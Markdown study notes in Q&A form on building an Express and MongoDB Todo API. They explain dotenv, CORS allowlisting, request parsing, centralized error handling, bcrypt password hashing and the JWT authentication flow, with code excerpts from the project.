# Learn — Backend Q&A (from dotenv onward)

Questions and answers from building the Todo API — simple explanations, same style as the chat.

---

## Progress legend

| Icon | Meaning |
|------|---------|
| ✅ | Covered / implemented in project |
| 💡 | Partial |
| ❌ | Not yet |

---

## 1. What is `require('dotenv/config')`?

**File:** `app.js` line 5

### Q: What is this? Is it a package?

**A:** Yes — the **`dotenv`** package (in `package.json`).

It reads your **`.env`** file and loads each variable into **`process.env`**:

```env
DB_CONNECTION=mongodb://localhost:27017/todo-app
PORT=3005
JWT_SECRET=your_secret
```

After that line runs:

```js
process.env.PORT           // "3005"
process.env.JWT_SECRET     // your secret
process.env.DB_CONNECTION  // mongo URL
```

Without `dotenv`, those would be **`undefined`**.

### Two ways to use it

```js
require('dotenv/config');           // auto-load .env (what you have)
require('dotenv').config();         // same thing, two lines
```

### Where your app uses it

| File | Uses |
|------|------|
| `app.js` | `PORT`, `DB_CONNECTION`, `NODE_ENV`, `CORS_ORIGIN*` |
| `controllers/auth.js` | `JWT_SECRET`, `JWT_EXPIRES_IN` |
| `middleware/auth.js` | `JWT_SECRET` |

**One line:** `dotenv` reads `.env` into `process.env` so secrets stay out of code.

---

## 2. What is `app.use(cors())`?

**File:** `app.js`

### Q: What is CORS? Does bare `cors()` allow any URL?

**A:** **CORS** = Cross-Origin Resource Sharing.

Browsers block JavaScript on **one origin** from calling an API on **another** unless the API allows it.

```
Frontend:  http://localhost:3000     (Next.js)
API:       http://localhost:3005     (Express)
           ↑ different port = different origin
```

Bare **`app.use(cors())`** with no options → **`Access-Control-Allow-Origin: *`** → **any website** can call your API from a browser.

**You were right** — that shouldn't be the case in production.

| Tool | CORS applies? |
|------|----------------|
| Browser (Next.js, React) | ✅ Yes |
| Postman / curl | ❌ No (no Origin header) |

CORS is a **browser rule**, not full API security. You still need JWT + ownership checks.

### What big apps do

Whitelist specific frontends — never `*` in production:

```js
app.use(cors({
  origin: ['https://app.yourcompany.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

| Option | Purpose |
|--------|---------|
| `origin` | Which frontends can call you |
| `credentials: true` | Allow cookies / auth headers cross-origin |
| `methods` | Limit HTTP methods |
| `allowedHeaders` | Allow `Authorization` (JWT) |

---

## 3. CORS in this project (configured)

### Q: Shouldn't `localhost:3000` be in `.env` too? What about the production check?

**A:** Yes. Two env vars + `NODE_ENV` check:

**`.env` (development):**
```env
NODE_ENV=development
CORS_ORIGIN_DEV=http://localhost:3000
CORS_ORIGIN=
```

**Production (when you deploy):**
```env
NODE_ENV=production
CORS_ORIGIN_DEV=
CORS_ORIGIN=https://your-app.vercel.app
```

**`app.js` logic:**
```js
const productionOrigins = parseOrigins(process.env.CORS_ORIGIN);
const devOrigins = parseOrigins(process.env.CORS_ORIGIN_DEV);

const allowedOrigins =
    process.env.NODE_ENV === 'production'
        ? productionOrigins      // strict — only prod URLs
        : devOrigins;            // dev — Next.js on :3000
```

| `NODE_ENV` | Uses | Allowed |
|------------|------|---------|
| **development** | `CORS_ORIGIN_DEV` | `http://localhost:3000` |
| **production** | `CORS_ORIGIN` | only your live domain(s) |

### The CORS check

```js
origin(origin, callback) {
    // Postman, curl, server-to-server — no Origin header
    if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);   // ✅ allow
    } else {
        callback(new AppError('Not allowed by CORS', 403));  // ❌ block
    }
}
```

| Request from | Result |
|--------------|--------|
| Next.js `:3000` | ✅ Allowed |
| Random site `evil.com` | ❌ Blocked → **403** |
| Postman (no Origin header) | ✅ Allowed |

#### Why it's a function, and what `callback` expects

A function instead of a static array means it runs **per request**, so it can consult a list, a database, or a pattern. The signature is a Node-style `callback(error, allow)`:

| Call | Effect |
|------|--------|
| `callback(null, true)` | Allowed — `cors` echoes that exact origin back in `Access-Control-Allow-Origin` |
| `callback(someError)` | Rejected — the error goes to the global error handler |

#### Why `!origin` is allowed — and why that's not a hole

Non-browser clients (Postman, curl, another server) send **no `Origin` header at all**. Allowing them is why Postman keeps working while `evil.com` is blocked.

That's not a loophole, because **CORS is enforced by the browser, not by your server**. A curl request was never restricted in the first place — there is nothing to bypass.

> ⚠️ CORS protects *your users' browsers* from other websites making authenticated requests on their behalf. It is **not access control** — that's `protect`'s job ([§8d](#8d-jwt-lifecycle--sign-verify-requser)).

---

### The rejection used to be a 500 — fixed

Originally the block path threw a plain `Error`:

```js
callback(new Error('Not allowed by CORS'));
```

A plain `Error` is **unrecognised** by the global handler ([§14](#14-centralized-error-handling--the-apperror-class)), so a blocked origin produced `500 Something went wrong` and was logged as `Unhandled error ===>` — as if the server had a bug. A blocked origin is an expected, operational outcome, not a crash.

**Now** (verified against the running server):

```
status: 403
body: {"success":false,"status":403,"message":"Not allowed by CORS"}
```

**Lesson worth generalising:** any library that takes an error *you* construct is a place to pass an `AppError`, or it lands in the "unknown bug" bucket and pollutes the logs.

---

### `credentials: true`

Sends `Access-Control-Allow-Credentials: true`, which lets a cross-origin browser request include **cookies**, and lets the frontend read the response when it uses `credentials: 'include'`.

| | Detail |
|---|--------|
| **Needed today?** | **No** — auth here is a Bearer token in a header, not a cookie |
| **Harmless?** | Yes, and it future-proofs cookie-based auth |
| **Rule it enforces** | With credentials enabled, the wildcard `*` origin becomes **illegal** — you must echo a specific origin, which the function form already does |

---

### `methods` and `allowedHeaders` — these are about **preflight**

This is the part that feels arbitrary until you see the mechanism.

For anything beyond a "simple" request — and `Content-Type: application/json`, an `Authorization` header, or a `PATCH`/`DELETE` **all** qualify — the browser sends an `OPTIONS` request **first** and waits for permission before sending the real one.

```
1. OPTIONS /api/v1/tasks     → "may I PATCH, with Content-Type and Authorization?"
2. server responds:  Access-Control-Allow-Methods: GET, POST, PATCH, DELETE
                     Access-Control-Allow-Headers: Content-Type, Authorization
3. PATCH /api/v1/tasks/123   → the actual request
```

So these two options are the **answers** to that question:

| Option | Answers |
|--------|---------|
| `methods: ['GET','POST','PATCH','DELETE']` | Which verbs are permitted cross-origin |
| `allowedHeaders: ['Content-Type','Authorization']` | Which headers the browser may send |

⚠️ If `Authorization` weren't listed, the browser would **refuse to send your token** — and that failure appears in the browser console, never in your server logs. That's what makes CORS bugs so confusing to debug.

**Two practical notes:**

- `cors` answers the `OPTIONS` request for you — you never write a handler for it
- This is why one browser `fetch` counts as **two** requests against the rate limiter — the puzzle from [§11](#11-rate-limiting--what-it-is-strategies-what-we-use) where Postman worked but the browser hit a 429

---

### Rule

**Config that changes per environment → `.env`  
Logic that never changes → code**

---

## 4. What is `app.use(express.json())`?

**File:** `app.js`

### Q: Does it intercept the response and convert to JSON?

**A:** **No** — it works on the **incoming request**, not the response.

| Code | Direction | Job |
|------|-----------|-----|
| **`express.json()`** | Client → server | Parse JSON body → `req.body` |
| **`res.json({ ... })`** | Server → client | Send JSON response |

**Without it:**
```
POST { "title": "Buy milk" }
req.body → undefined ❌
```

**With it:**
```
POST { "title": "Buy milk" }
req.body → { title: "Buy milk" } ✅
req.body.title → "Buy milk"
```

**One line:** Reads JSON from the request and puts it on `req.body`.

---

## 5. What is `app.use(express.urlencoded({ extended: true }))`?

**File:** `app.js`

### Q: What does this do?

**A:** Parses **HTML form** data into `req.body` — not JSON.

**Form style:**
```
Content-Type: application/x-www-form-urlencoded
title=Buy+milk&status=pending
```

**Becomes:**
```js
req.body → { title: "Buy milk", status: "pending" }
```

### `extended: true`

Uses **`qs`** library — supports nested fields:
```
user[name]=Ashish → { user: { name: "Ashish" } }
```

### Do you need it?

| Client sends | Middleware |
|--------------|------------|
| JSON (Postman raw, fetch) | `express.json()` ✅ main one |
| HTML `<form>` | `express.urlencoded()` |

Your todo API uses JSON — `express.json()` is essential. `urlencoded` is optional backup.

---

## 6. Global error handler — `(err, req, res, next)`

⚠️ **Superseded by [§14 Centralized error handling](#14-centralized-error-handling--the-apperror-class).** The handler shown below is the **first version**, kept because the Express mechanics (4-argument rule, `next(e)`, middleware order) still apply exactly. The response shape, status codes, and the "what it does NOT catch" table are all out of date — §14 has the current behaviour.

### Q: How does Express know this is an error handler?

**A:** By **argument count**:

| Parameters | Type |
|------------|------|
| `(req, res, next)` | Normal middleware |
| `(req, res)` | 404 / final handler |
| **`(err, req, res, next)`** | **Error handler** — 4 args required |

First parameter = the error object. That's the Express rule.

### Q: How do errors get there?

Via **`next(error)`** in your controllers:

```js
exports.createTask = async (req, res, next) => {
    try {
        // ...
    } catch (e) {
        next(e);   // sends to error handler
    }
};
```

```
Controller throws → catch → next(e) → error handler → JSON response
```

### What errors it handles (your app)

| Source | Example | Status |
|--------|---------|--------|
| Mongoose validation | Missing `title`, bad enum | **400** |
| Duplicate email | Same email register twice | **500** (could improve to 400) |
| CORS blocked | Wrong origin in browser | **500** |
| Other thrown errors | DB down during query | **500** |

### What it does NOT catch

| Situation | Goes to |
|-----------|---------|
| Unknown URL `/foo` | **404 handler** (line 48) |
| `401` from `protect` | Sent directly — no `next(err)` |
| Async error without try/catch | Can **crash** server |
| DB fail at startup | Separate `.catch()` on `mongoose.connect` |

### Your handler

```js
app.use((err, req, res, next) => {
    console.log('Error:', err.message);

    const status = err.status || (err.name === 'ValidationError' ? 400 : 500);

    res.status(status).json({
        message: err.message || 'Internal server error'
    });
});
```

Client always gets **JSON**, not HTML crash page.

### Middleware order

```
1. cors, json, routes     ← normal flow
2. 404 handler            ← route not found
3. error handler          ← MUST be last
```

| Handler | Meaning |
|---------|---------|
| 404 | "That URL doesn't exist" |
| Error | "URL exists but something broke" |

---

## 7. Bonus — related concepts from same learning arc

### `.env` vs `.env.example`

| File | Contains | Git? | App uses? |
|------|----------|------|-----------|
| `.env` | Real secrets | ❌ Never | ✅ Yes |
| `.env.example` | Placeholder template | ✅ Yes | ❌ No |

### `express.static('public')`

Serves files from `public/` folder (HTML, CSS, JS). Your demo `index.html` was there — gitignored until React app.

### Request flow (full picture)

```
Client request
      │
      ▼
  cors          ← browser origin check
      │
      ▼
  express.json  ← parse body → req.body
      │
      ▼
  protect       ← JWT → req.user (on /tasks)
      │
      ▼
  controller    ← business logic
      │
      ├── res.json()          → success response
      └── throw / next(err)   → global error handler → one JSON shape
```

Since [§14](#14-centralized-error-handling--the-apperror-class), **every** failure takes the second branch — including `protect`'s 401s and the rate limiter's 429s, which used to answer directly.

---

## Quick reference table

| Line in `app.js` | One line |
|------------------|----------|
| `require('dotenv/config')` | Load secrets from `.env` |
| `cors({ origin: ... })` | Which frontends can call API from browser |
| `express.json()` | Parse JSON request body → `req.body` |
| `express.urlencoded()` | Parse form request body → `req.body` |
| `express.static('public')` | Serve static files |
| 404 handler | Unknown route → `AppError(404)` → error handler |
| Error handler `(err,...)` | Every failure → one JSON shape; bugs → generic 500 |
| `utils/AppError.js` | Marks errors whose message is safe to show the client |
| `apiLimiter` / `authLimiter` | Cap requests per IP → `429` if over limit |

---

> Pick a topic, ask in chat, or check `authflow.md` / `mongoStructure.md` for JWT and database deep dives.

---

## 8. Routes → Controller → Model (`POST /auth/register`)

**Goal:** Understand how one URL travels through the app — using register as the example.

### Your understanding (correct ✅)

```
POST /auth/register
      │
      ▼
app.js          → mounts /auth
      │
      ▼
routes/auth.js  → /register → register function
      │
      ▼
controllers/auth.js → logic, User.create
      │
      ▼
models/user.js  → schema + pre('save') hash → MongoDB
```

---

### Step 1 — `app.js` mounts the auth router

```45:46:C:\Users\admin\Desktop\CODE\CODE-FAMILIRITY\NODE_JS\todo_api\app.js
app.use('/tasks', TaskRoutes)
app.use('/auth', AuthRoutes)
```

Anything starting with **`/auth`** goes to `routes/auth.js`.

So `POST /auth/register` → prefix `/auth` + route `/register`.

**Before this runs:** `cors`, `express.json()` already ran → `req.body` has `{ email, password, role }`.

**Register is public** — no `protect` middleware (unlike `/tasks`).

---

### Step 2 — `routes/auth.js` maps URL to controller

```1:9:C:\Users\admin\Desktop\CODE\CODE-FAMILIRITY\NODE_JS\todo_api\routes\auth.js
const express = require("express");
const router = express.Router();

const { register, login } = require('../controllers/auth');

router.post('/register', register);
router.post('/login', login);

module.exports = router;
```

| File | Job |
|------|-----|
| **`routes/auth.js`** | **URLs only** — which path + HTTP method → which function |
| **`controllers/auth.js`** | **Logic** — what actually happens |

`router.post('/register', register)` means:

> When someone **POST**s to **`/register`** (under `/auth`), run the **`register`** function.

Routes = **reception desk**. Controllers = **the work**.

---

### Step 3 — `controllers/auth.js` register logic

```5:18:C:\Users\admin\Desktop\CODE\CODE-FAMILIRITY\NODE_JS\todo_api\controllers\auth.js
exports.register = async (req, res, next) => {
    try {
        const { email, password, role } = req.body;
        const user = await User.create({ email, password, role });
        res.status(201).json({
            message: 'User created successfully. Please login.',
            user: { id: user._id, email: user.email, role: user.role }
        });
    } catch (e) {
        if (e.code === 11000) {
            return res.status(400).json({ message: 'Email already registered' });
        }
        next(e);
    }
};
```

| Line | What |
|------|------|
| `req.body` | Data from client (thanks to `express.json()`) |
| `User.create(...)` | Ask Mongoose to save a new user |
| `res.status(201).json(...)` | Success — 201 Created, no token (login separately) |
| `e.code === 11000` | MongoDB duplicate email → 400 |
| `next(e)` | Other errors → global error handler |

---

### Step 4 — `models/user.js` schema + pre-save + model

**Schema** = rules for one user document:

```4:21:C:\Users\admin\Desktop\CODE\CODE-FAMILIRITY\NODE_JS\todo_api\models\user.js
const UserSchema = mongoose.Schema({
    email: {
        type: String,
        required: true,
        unique: true,
        lowercase: true,
        trim: true
    },
    password: {
        type: String,
        required: true
    },
    role: {
        type: String,
        enum: ['admin', 'user', 'manager'],
        default: 'user'
    }
});
```

| Field rule | Effect |
|------------|--------|
| `required: true` | Must be present or validation error |
| `unique: true` | No two users same email |
| `lowercase` / `trim` | Normalizes email before save |
| `enum` | Only allowed role values |
| `default: 'user'` | Role if not sent |

**pre('save')** = Mongoose hook **before** write to MongoDB:

```23:28:C:\Users\admin\Desktop\CODE\CODE-FAMILIRITY\NODE_JS\todo_api\models\user.js
UserSchema.pre('save', async function () {
    if (!this.isModified('password')) return;

    const salt = await bcrypt.genSalt(10);
    this.password = await bcrypt.hash(this.password, salt);
});
```

Controller passes plain `password` → hook hashes it → DB stores `$2a$10$...`.

**Model export:**

```js
module.exports = mongoose.model('User', UserSchema);
```

| Piece | Result |
|-------|--------|
| Model name `'User'` | Collection **`users`** in MongoDB |
| `User` in code | Tool to create/find/update users |

---

### Step 5 — What `User.create()` does

```js
await User.create({ email, password, role });
```

Inside Mongoose (simplified):

```
1. Build document from schema + your data
2. Run validation (required, enum, etc.)
3. Run pre('save') hook → hash password
4. INSERT into MongoDB collection "users"
5. Return saved document (with _id, hashed password, etc.)
```

You **don't** hash in the controller — the model handles it.

---

### Full flow diagram

```
Postman: POST /auth/register
         Body: { "email": "a@b.com", "password": "123456" }
                │
                ▼
         app.js  (json → req.body)
                │
                ▼
         routes/auth.js  POST /register → register
                │
                ▼
         controllers/auth.js
                │  User.create({ email, password, role })
                ▼
         models/user.js
                │  validate schema
                │  pre('save') → bcrypt hash
                │  save to DB "users"
                ▼
         MongoDB document:
         { _id, email, password: "$2a$10$...", role: "user" }
                │
                ▼
         Response 201:
         { message, user: { id, email, role } }   ← no password
```

---

### Routes vs controllers vs models (one table)

| Layer | File | Question it answers |
|-------|------|---------------------|
| **App** | `app.js` | Which big paths exist? (`/auth`, `/tasks`) |
| **Route** | `routes/auth.js` | Which URL + method → which handler? |
| **Controller** | `controllers/auth.js` | What do we do with req/res? |
| **Model** | `models/user.js` | What does data look like? How is it saved? |
| **DB** | MongoDB `users` | Where documents live |

---

## 8b. Same path, different logic — `POST /auth/login`

Login uses the **same layers** as register. Only the **controller** does different work.

```
Same:  app.js → routes/auth.js → controllers/auth.js → User model
Extra in login:  findOne  →  bcrypt.compare  →  jwt.sign
```

### Route (same pattern)

```js
router.post('/login', login);   // routes/auth.js
```

Public — no `protect` (you're logging in to *get* the token).

---

### Register vs login — side by side

| Step | **Register** | **Login** |
|------|--------------|-----------|
| 1 | Read `email`, `password` from `req.body` | Same |
| 2 | `User.create({ email, password, role })` | `User.findOne({ email })` |
| 3 | pre-save hook hashes password | — |
| 4 | — | `bcrypt.compare(password, user.password)` |
| 5 | — | `jwt.sign({ userId }, JWT_SECRET, { expiresIn })` |
| 6 | `201` + user (**no token**) | `200` + **token** + user |

---

### Login controller — the two extra steps

```js
exports.login = async (req, res, next) => {
    try {
        const { email, password } = req.body;

        // Step A — find existing user (NOT create)
        const user = await User.findOne({ email });
        if (!user) {
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        // Step B — compare plain password vs hash in DB
        const isMatch = await bcrypt.compare(password, user.password);
        if (!isMatch) {
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        // Step C — issue JWT
        const token = jwt.sign(
            { userId: user._id },
            process.env.JWT_SECRET,
            { expiresIn: process.env.JWT_EXPIRES_IN || '7d' }
        );

        res.status(200).json({
            message: 'Login successful',
            token,
            user: { id: user._id, email: user.email, role: user.role }
        });
    } catch (e) {
        next(e);
    }
};
```

---

### Step A — `User.findOne({ email })`

| | Register | Login |
|---|----------|-------|
| Mongoose method | `User.create` | **`User.findOne`** |
| Meaning | Insert **new** document | Find **existing** document |
| Not found | Validation / duplicate errors | **401** Invalid credentials |

Returns full user doc including **hashed** `password` (needed for compare).

---

### Step B — `bcrypt.compare(password, user.password)`

```
Request:     "password123"        ← plain text from req.body
Database:    "$2a$10$xyz..."     ← hash from register pre-save hook

bcrypt.compare(plain, hash)  →  true / false
```

| Result | Response |
|--------|----------|
| `true` | Continue → create token |
| `false` | **401** Invalid credentials |

Same error message as "user not found" — don't reveal which failed.

**No pre-save hook on login** — password was already hashed at register.

---

### Step C — `jwt.sign({ userId: user._id }, ...)`

Creates the token the client uses on protected routes:

```
POST /auth/login  →  { token: "eyJhbG..." }
        │
        ▼
GET /tasks
Authorization: Bearer eyJhbG...
        │
        ▼
protect middleware  →  jwt.verify  →  req.user
```

See [`authflow.md`](authflow.md) for full JWT deep dive.

---

### Login flow diagram

```
Postman: POST /auth/login
         Body: { "email": "a@b.com", "password": "123456" }
                │
                ▼
         app.js  (json → req.body)
                │
                ▼
         routes/auth.js  POST /login → login
                │
                ▼
         controllers/auth.js
                │  User.findOne({ email })
                │  bcrypt.compare(plain, hash)
                │  jwt.sign({ userId: user._id })
                ▼
         Response 200:
         { message, token, user }   ← token saved by client for /tasks
```

---

### One-line summary

**Register = create user + hash on save. Login = find user + compare password + issue JWT.**

That token is sent on every protected request (`GET /tasks`, etc.) as `Authorization: Bearer <token>`.

---

## 8b2. Task ownership — where `userId` comes from

**Goal:** Trace one id from register → login token → `protect` → create/list tasks.

Register does **not** put `userId` on tasks. MongoDB only creates the User’s `_id`. Tasks get `userId` later, when you create them with the same login token.

### Id journey (table)

| Step | What happens | Where | Field name |
|------|--------------|-------|------------|
| **1. Register** | MongoDB creates User | `User.create` → `users` collection | User `_id` (auto) |
| **2. Login** | That `_id` is embedded in the JWT | `jwt.sign({ userId: user._id }, …)` | Payload `userId` |
| **3. Any `/tasks` call** | Same token → `protect` verifies → loads User | `middleware/auth.js` | `req.user` (= User doc) |
| **4. Create task** | Copy logged-in user’s id onto the task | `userId: req.user._id` in `createTask` | Task `userId` |
| **5. Get / update / delete** | Filter so you only touch **your** tasks | `{ userId: req.user._id }` | Query filter |

```
REGISTER     User { _id: "6a71..." }          ← no tasks yet; no userId field on User
    │
LOGIN        jwt.sign({ userId: "6a71..." })  ← same id inside token
    │
POST /tasks  Authorization: Bearer <same token>
    │           protect → jwt.verify → req.user._id
    │           Task { …, userId: req.user._id }   ← link created here
    │
GET /tasks   filter = { userId: req.user._id }     ← only your tasks
```

### Naming cheat sheet

| Place | Name | Same value? |
|-------|------|-------------|
| `users` collection | `_id` | ✅ |
| JWT payload | `userId` | ✅ same as User `_id` |
| `req.user` after protect | `req.user._id` | ✅ |
| `tasks` collection | `userId` | ✅ points at that User |

**One line:** Register makes the id → login puts it in the token → `protect` restores `req.user` → create task saves it as `userId` → list/update/delete filter by that `userId`.

See also: [`authflow.md`](authflow.md) (JWT deep dive), [`mongoStructure.md`](mongoStructure.md) (linking collections).

---

## 8c. Password hashing — does pre-save decrypt? (register vs login)

**File:** `models/user.js` lines 23–28

### Q: Does `UserSchema.pre('save')` decrypt the password?

**A:** **No** — it **hashes** (one-way). There is no decrypt step anywhere in this app.

### Hash vs decrypt

| | **Hash** (what you use) | **Decrypt** |
|---|-------------------------|-------------|
| Direction | One-way — **cannot reverse** | Two-way — encrypt & decrypt |
| Stored in DB | `$2a$10$xyz...` | Could recover plain text |
| Login check | `bcrypt.compare(plain, hash)` | Decrypt then compare |
| Passwords | ✅ Industry standard | ❌ Never for passwords |

```js
UserSchema.pre('save', async function () {
    if (!this.isModified('password')) return;

    const salt = await bcrypt.genSalt(10);
    this.password = await bcrypt.hash(this.password, salt);
});
```

```
"password123"  →  bcrypt.hash  →  "$2a$10$N9qo8uLOick..."
     plain           ONE-WAY              stored in MongoDB
```

You **cannot** turn `$2a$10$...` back into `password123`.

---

### Register — pre('save') runs (hash before store)

```
User.create({ password: "password123" })
        │
        ▼
   pre('save') runs          ← only on SAVE (create triggers save)
        │
        ▼
   bcrypt.hash → "$2a$10$..." stored in MongoDB
```

| Why pre runs | `User.create` = build document + **save** to DB |

Controller passes **plain** password → hook hashes → DB gets hash.

---

### Login — pre('save') does NOT run

```
User.findOne({ email })       ← READ only, no save
        │
        ▼
   pre('save') skipped        ← nothing written to DB
        │
        ▼
   bcrypt.compare(plain, hash from DB)
```

| Why pre skips | `findOne` only **reads** — password field is not being saved |

Login uses **`bcrypt.compare`** in the controller — not the pre hook.

---

### What `bcrypt.compare` does internally

It does **not** decrypt the stored hash. It **re-hashes** what the user typed and checks for a match:

```
Login input:     "password123"        ← plain from req.body
Stored in DB:    "$2a$10$xyz..."     ← hash from register

bcrypt.compare:
  1. Takes plain "password123"
  2. Reads salt embedded inside stored hash
  3. Runs same hash math as register
  4. Compares result with stored hash
  5. Returns true / false
```

Like checking a fingerprint — you don't "un-fingerprint" the file; you scan the finger again and see if it matches.

```js
const isMatch = await bcrypt.compare(password, user.password);
// compare(what they typed, what's in DB)
```

---

### Register vs login — password handling

| | **Register** | **Login** |
|---|--------------|-----------|
| Mongoose | `User.create` | `User.findOne` |
| `pre('save')` | ✅ Runs | ❌ Does not run |
| bcrypt function | **`hash`** — create stored value | **`compare`** — check plain vs stored |
| Password in DB | **Written** (hashed) | **Read** only |
| Where bcrypt runs | Model hook (`user.js`) | Controller (`auth.js`) |

---

### Why `isModified('password')` in pre-save?

```js
if (!this.isModified('password')) return;
```

**In one line:** only hash when the password actually changed.

`this` is the document being saved. `isModified('password')` asks Mongoose's dirty-tracking whether that field was assigned since the document was loaded.

#### Traced with real values

Say the password is `cat123` and hashing it gives `$2a$10$AAA`.

**Step 1 — register.** New document, so every field counts as modified → the hook hashes.

| In the database | |
|---|---|
| email | `ash@x.com` |
| password | `$2a$10$AAA` |

Login works: `bcrypt.compare('cat123', '$2a$10$AAA')` → `true`

**Step 2 — later, the user changes only their email.**

```js
const user = await User.findOne({ email: 'ash@x.com' });
// user.password is now "$2a$10$AAA" — the HASH, loaded from the DB.
// The plain password is long gone.

user.email = 'ashish@x.com';
await user.save();
```

| | Without the guard | With the guard |
|---|-------------------|----------------|
| Hook | Hashes whatever it finds — the hash | `isModified` is `false` → returns early |
| Stored password | `$2a$10$BBB` ← **a hash of a hash** | `$2a$10$AAA` ← untouched |
| `bcrypt.compare('cat123', stored)` | `false` — **locked out forever** | `true` |

No error, no warning. The email change silently destroys the login.

**Step 3 — an actual password change.** `user.password = 'dog456'` → `isModified` is `true` → hashed normally.

#### `return` skips the hashing, not the save

In a `pre` hook, resolving normally means "carry on and write the document". The only way to abort a save is to **throw**. That's why in step 2 the new email *is* still stored.

#### Does this project even need it?

**Today, no** — and that's worth being honest about. The only User write in the codebase is `User.create` in `register`, so `isModified` is always `true` and the early return never fires.

⚠️ But note **why** it's safe, because it's easy to get this wrong: it is *not* the duplicate-email check in `register` that protects you. Re-hashing needs a **second `save()` on an already-saved document**, and no such code path exists yet. Add any of these and it appears immediately:

- a change-password endpoint
- a profile / email update
- `lastLoginAt` stamped on login
- an `emailVerified` flag

One comparison, versus a silent permanent lockout. Keep the line.

---

### One-line summaries

**Register:** pre-save **hashes** before store (one-way, not decrypt).

**Login:** no pre hook — **`bcrypt.compare`** re-hashes input and checks it matches stored hash.

**Never** store or transmit plain passwords in DB after register. **Never** decrypt — compare only.

---

## 8d. JWT lifecycle — `sign`, `verify`, `req.user`

**Files:** `controllers/auth.js` (sign), `middleware/auth.js` (verify + attach)

Three lines carry the whole auth system. Following them in order explains what a token can and cannot do.

---

### Step 1 — `jwt.sign` creates the token (login only)

```js
const token = jwt.sign(
    { userId: user._id },
    process.env.JWT_SECRET,
    { expiresIn: process.env.JWT_EXPIRES_IN || '7d' }
);
```

| Argument | Job | Gotcha |
|----------|-----|--------|
| **`{ userId: user._id }`** — payload | The data baked into the token | Base64-**encoded**, *not* encrypted. Paste a token into [jwt.io](https://jwt.io) and the user id is readable. **Never put secrets in it** |
| **`JWT_SECRET`** — signing key | Produces the signature that makes the token tamper-proof | Anyone holding this can mint a token for **any** user. Crown jewel of the app |
| **`{ expiresIn }`** — options | Adds the `exp` claim | 7 days is long — see the revocation problem below |

The only place a token is created in this project.

---

### Step 2 — `jwt.verify` checks it (every protected request)

```js
decoded = jwt.verify(token, process.env.JWT_SECRET);
```

**What it checks — two things, both local, no database:**

| Check | Fails when |
|-------|-----------|
| **Signature** | Payload was altered, or it was signed with a different secret |
| **Clock** (`exp`) | The expiry time has passed |

On success it returns the decoded payload — note `iat` and `exp` were added by `sign`:

```js
{ userId: '6a7b242f3b7877edcc1769e4', iat: 1786455087, exp: 1787059887 }
```

**What it does NOT check:** whether the user is genuine. It's cryptography plus a clock — it has no idea if that `userId` still exists. A token stays valid after the user is deleted, banned, or demoted.

**It throws rather than returning `false`:**

| Error | Meaning |
|-------|---------|
| `JsonWebTokenError` | Bad signature or malformed token |
| `TokenExpiredError` | Past `exp` |

Both mean "not authorized", never "the server broke" — which is why this call sits in its **own** `try` and becomes a 401 ([§14](#14-centralized-error-handling--the-apperror-class)).

---

### Step 3 — the database lookup answers the other question

```js
const user = await User.findById(decoded.userId).select('-password');
if (!user) {
    throw new AppError('User no longer exists', 401);
}
```

| Step | Question | Cost |
|------|----------|------|
| `jwt.verify` | Is this token authentic and unexpired? | Free — pure computation |
| `User.findById` | Does this person still exist? | One DB query per request |

That query is the price of freshness: a deleted or demoted user is caught immediately. Apps that put `role` **in** the token skip the query but then carry stale permissions until expiry.

Its own separate `try` matters — a Mongo outage here must be a 500 about a real outage, not a misleading "invalid token".

---

### Step 4 — `req.user = user` hands it onward

```js
req.user = user;
next();
```

`req` is a plain object living for one request, so you can hang properties on it. `next()` passes that same object down the chain, making `req.user` readable by every route and controller after this point.

**This is where "who is asking" becomes available**, which is what makes ownership work:

```js
const filter = { userId: req.user._id };                     // getTasks
const task = new Task({ ...value, userId: req.user._id });   // createTask
```

| Property | Why it matters |
|----------|----------------|
| **Trust boundary** | `req.user` comes from a signed token + a DB read, so it can't be forged. Taking the id from `req.body` would let anyone impersonate anyone — which is why `validateTaskBody` strips `userId` as a server-owned field |
| **Per-request** | Set fresh each time, gone when the request ends. Concurrent users never see each other's |
| **No password** | `.select('-password')` means even `res.json(req.user)` leaks nothing |

---

### Q: If I have a JWT, can I fake someone's identity?

**It depends which "have" — and this is the most important thing to understand about tokens.**

| Scenario | Can you impersonate? | Why |
|----------|---------------------|-----|
| You **steal someone's** token | ✅ **Yes, completely** | A JWT is a **bearer** credential — whoever bears it *is* that user. `protect` only asks "valid and unexpired?", never "is this the same person we issued it to?" |
| You **edit** a token you hold | ❌ No | Change the payload and the signature stops matching → `verify` throws → 401 |
| You have the **secret** | ✅ Yes, for anyone | You can mint valid tokens at will |

**The subtle one:** if `JWT_SECRET` is short or guessable, an attacker who captures **one** valid token can brute-force the secret **offline** — their hardware, no requests to your server, nothing in your logs — then forge freely. Use 32+ random bytes, not a memorable phrase.

---

### Q: What's the real weakness of this design?

**You cannot take a token back.** There's no logout that truly works, because verification deliberately needs no database lookup. A leaked token is valid until `exp` — a **7-day** window here — and nothing in the current code can stop it.

| Fix | How it works |
|-----|--------------|
| **Short access token + refresh token** | Access token lives 5–15 min; the refresh token is stored server-side and *can* be revoked. What production systems do |
| **`tokenVersion` on the user** | Put a version number in the payload; reject tokens whose version doesn't match the stored one. Bumping it = instant logout everywhere + a password-reset kill switch. **Cheap here**, because `protect` already loads the user |

**Where tokens actually leak** — rarely from the server: `localStorage` read by an XSS payload, tokens pasted into logs or URLs, browser history, a compromised third-party frontend script. Helmet's CSP ([§10b](#10b-safe-http-headers--what-helmet-actually-does)) and morgan not logging the `Authorization` header ([§12](#12-request-logging-morgan--health-check)) both help. Over plain HTTP the token is readable on the wire — HTTPS is non-negotiable in production.

---

### Q: Where does the id in the payload come from?

`login` looks the user up by **email** — the only unique thing a user actually knows; nobody types their own ObjectId — and `findOne` returns the whole document, so `_id` comes along for free.

⚠️ **Mongoose generates the `ObjectId`, not MongoDB.** It's 12 bytes built from a timestamp, a machine/process id and a counter, created in your Node process, so `user._id` exists *before* the insert reaches the database.

| Step | What happens | Where it lives |
|------|--------------|----------------|
| Register | Mongoose generates the `ObjectId` | `users._id` |
| Login | `findOne({ email })` → `user._id` | in memory |
| Login | `jwt.sign({ userId: user._id })` | JWT payload |
| Any `/tasks` call | `verify` → `findById(decoded.userId)` | `req.user._id` |
| Create task | `userId: req.user._id` | `tasks.userId` |
| Read / update / delete | `{ _id: req.params.id, userId: req.user._id }` | query filter |

